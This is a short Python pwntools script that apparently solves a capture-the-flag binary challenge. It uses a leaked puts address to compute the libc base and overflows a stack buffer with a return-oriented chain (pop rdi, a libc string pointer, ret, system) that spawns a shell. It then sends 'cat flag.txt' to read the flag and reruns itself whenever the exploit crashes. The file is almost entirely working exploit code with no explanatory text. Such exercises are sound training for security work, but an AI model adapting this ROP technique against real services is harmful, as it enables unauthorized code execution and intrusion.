from pwn import *

elf = ELF('./task')
libc = ELF('./libc6_2.31-0ubuntu9.1_amd64.so')

def solve():
	if args.GDB:
		p = gdb.debug(elf.path, '\n'.join([
			"b *ask+48",
			"c"
		]), env={'LD_PRELOAD': libc.path})
	elif args.REMOTE:
		p = remote("localhost" if not args.ADDR else args.ADDR, 11311)
	else:
		p = process(elf.path, env={'LD_PRELOAD': libc.path}) 

	# https://libc.blukat.me/?q=puts%3A0x7fe30f40c5a0%2Csetvbuf%3A0x7fe30f40ce60&l=libc6_2.31-0ubuntu9.1_amd64

	leak_puts = p.recvuntil(b'setvbuf at: ', drop=True)
	leak_puts = leak_puts.split(b':')[1].strip()
	leak_puts = int(leak_puts, 16)
	print(f"puts leak: {hex(leak_puts)}")
	libc_base = leak_puts - 0x0875a0
	libc.address = libc_base
	print(f"libc base: {hex(libc_base)}")

	payload = b'A' * 0x18

	# libc pop rdi
	# 0x0000000000026b72 : pop rdi ; ret

	payload += p64(libc_base + 0x0000000000026b72)
	payload += p64(libc_base + 0x1b75aa)

	# libc ret
	# 0x0000000000025679 : ret
	payload += p64(libc_base + 0x0000000000025679)

	# call system
	payload += p64(libc.symbols['system'])

	p.sendline(payload)

	sleep(0.5)
	p.sendline(b'cat flag.txt')

	print(p.clean(1.0))

while True:
	try:
		# sometimes expoit crashes, so run it again
		solve()
		break
	except:
		print("Crashed, running again")
